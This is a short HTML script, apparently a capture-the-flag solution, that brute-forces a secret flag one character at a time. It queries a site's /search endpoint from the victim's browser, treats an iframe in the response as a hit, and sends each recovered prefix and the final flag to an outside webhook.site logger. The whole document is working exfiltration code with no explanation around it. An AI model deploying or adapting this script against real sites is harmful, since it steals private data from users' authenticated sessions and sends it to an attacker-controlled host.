<script>
const TARGET = "/search?q=";
const LOGGER = "https://webhook.site/a40b633a-f128-4f03-aaba-0122b02d749c";
const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";

function log(msg) {
  fetch(LOGGER + "?d=" + encodeURIComponent(msg)).catch(()=>{});
}

async function check(prefix) {
  try {
    const res = await fetch(TARGET + encodeURIComponent(prefix));
    const text = await res.text();

    // cek apakah ada hasil
    return text.includes("<iframe");
  } catch {
    return false;
  }
}

async function solve(prefix) {
  log("progress: " + prefix);

  for (const c of ALPHABET) {
    const attempt = prefix + c;

    if (await check(attempt)) {
      log("found: " + attempt);

      if (c === '}') {
        log("FLAG: " + attempt);
        return;
      }

      return solve(attempt);
    }
  }
}

solve("CBD{");
</script>
